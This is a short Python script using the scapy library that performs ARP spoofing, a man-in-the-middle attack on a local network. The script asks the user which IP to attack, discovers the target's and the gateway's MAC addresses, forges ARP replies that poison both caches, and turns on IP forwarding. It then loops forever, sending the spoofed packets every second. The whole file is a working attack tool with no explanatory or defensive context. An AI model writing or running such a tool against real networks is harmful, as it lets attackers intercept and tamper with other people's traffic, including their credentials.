from scapy.all import *
import os
import sys
import time

my_ip = "192.168.230.131"
my_mac = "00:0c:29:70:0e:09"

target_ip = "192.168.230.129"

target_ip = raw_input("Who... would you like to attack...? Input target IP : ")

result_target_ip = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=target_ip))

target_mac = result_target_ip.hwsrc

print ("Target IP : " + target_ip + "Target Mac : " + target_mac)

# discovery target ip/mac

print("----------running-----------")

p = sr1(IP(dst="www.google.com", ttl = 0)/ICMP()/"XXXXXXXXXXX")

ip = p.src

result = sr1(ARP(op=ARP.who_has, psrc=my_ip, pdst=ip))

router_mac = result.hwsrc
router_ip = result.psrc

print ("Routers IP : " + router_ip + " Routers Mac : " + router_mac) 

# Forge the ARP packet for the victim
arpFakeVic = ARP()
arpFakeVic.op=2
arpFakeVic.psrc=router_ip
arpFakeVic.pdst=target_ip
arpFakeVic.hwdst=target_mac

# Forge the ARP packet for the default GW
arpFakeDGW = ARP()
arpFakeDGW.op=2
arpFakeDGW.psrc=target_ip
arpFakeDGW.pdst=router_ip
arpFakeDGW.hwdst=router_mac

#Send ARP packet & use_ip_forward
while True:
	with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
		ipf.write('1\n')

	# Send the ARP replies
	print("--Sending ARP pakcets--")
	send(arpFakeVic)
	send(arpFakeDGW)
	time.sleep(1)

